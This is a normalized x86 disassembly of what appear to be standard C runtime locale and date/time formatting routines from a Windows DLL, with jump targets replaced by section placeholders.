mov [ ebp - 0x8 ] eax
call sub_1002ddb0
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xb8
push esi
push ebx
lea edi [ ebx + 0xb8 ]
call sub_1002a0f0
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
push edi
call sub_10027160
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
push edi
call sub_10027160
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0xc
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_10027160
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
push edi
call sub_10027160
add [ ebp - 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
dec [ ebp - 0x14 ]
pop ecx
lea edi [ edi + eax + 0x1 ]
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_1002e87c
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_10027160
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
push edi
call sub_10027160
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
push edi
call sub_10027160
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
push edi
call sub_10027160
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
sub_10035d4f
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_10035d6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_10035dea
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
cmp eax 0x59
push esi
push edi
mov ebx ecx
mov esi edx
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x5a
je r-xdata
call sub_1002d4db
xor edi edi
jmp r-xdata
cmp eax 0x1fa3
jle r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
call sub_1002d4db
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_1003a848
call sub_1003a4c9
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
mov ecx ebx
setne al
mov ebx eax
mov edx [ edx + ebx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax 0x7
je r-xdata
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
sub eax 0x4
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xb
mov edx [ ebp + 0x10 ]
jg r-xdata
cmp eax 0x6
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
call sub_10035d4f
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
pop edx
xor edi edi
cmp eax edi
jl r-xdata
mov eax [ esi ]
dec eax
dec eax
je r-xdata
cmp eax 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push edi
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
cmp eax 0x3b
jmp r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
dec eax
je r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
cmp eax edi
jne r-xdata
sub eax 0x18
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi ebx
call sub_10035d6f
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100361d2
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push ecx
pop eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax ] 0x25
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
jmp r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
jmp r-xdata
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_100361d2
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] edi
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
xor edi edi
cmp esi edi
jl r-xdata
cmp eax 0x16d
jg r-xdata
cmp eax edi
je r-xdata
push ebx
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov [ eax ] 0x20
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
push eax
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
cmp eax edi
jl r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_100361d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x1c ]
xor ebx ebx
sub eax ebx
push edi
je r-xdata
mov edi [ esi + 0xa0 ]
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x2
mov ecx [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ esi + 0xa4 ]
jmp r-xdata
mov edi [ esi + 0xa8 ]
jmp r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov edx 0x76c
add dx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x20 ] dx
mov dx [ eax + 0x10 ]
inc dx
mov [ ebp - 0x1e ] dx
mov dx [ eax + 0xc ]
mov [ ebp - 0x1a ] dx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x18 ] dx
mov dx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x14 ] ax
push ebx
xor eax eax
push edi
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ esi + 0xac ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x16 ] dx
call ecx
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ GetTimeFormatA@IAT ]
cmp [ esi + 0xb0 ] 0x1
mov eax [ ebp + 0x10 ]
je r-xdata
xor edx edx
mov [ ebp - 0x8 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xc ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_1002a4a4
pop ecx
cmp eax ebx
je r-xdata
call sub_100375d0
mov eax esp
cmp eax ebx
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x10 ]
mov ebx eax
push ebx
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push [ esi + 0xac ]
call [ ebp - 0xc ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x8 ]
call sub_1002d97d
pop ecx
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov ecx esi
push ebx
push [ ebp + 0x8 ]
call sub_10035dea
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_1003a897
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov edx [ ecx ]
mov [ ebp - 0x10 ] eax
mov al [ ebx ]
mov [ edx ] al
inc [ ecx ]
mov eax [ ebp - 0x10 ]
inc ebx
dec [ esi ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
push [ ebp + 0x8 ]
push ecx
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp + 0x1c ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_1003a897
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
mov eax edx
dec eax
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp + 0x8 ]
push eax
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov al 0x42
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
sub_10036633
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_1002a8c8
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_1002d4db
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov al [ esi ]
lea ecx [ ebp + 0x8 ]
call sub_10035dea
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_100367d7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10036633
add esp 0x18
pop ebp
retn
sub_100367f7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_1002d4db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
sub_1003686b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_1002d4db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
sub_10036920
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_1003a9a5
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_10036982
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_1002a840
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_1002a840
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10027150
leave
retn
push r--data
push esi
call sub_1002a840
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_1003a9f7
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_10036a26
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10036a4a
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_10036a7e
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_10036a99
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002f139
mov esi eax
mov edx edi
add esi 0x9c
call sub_10036a4a
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_1003a9a5
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
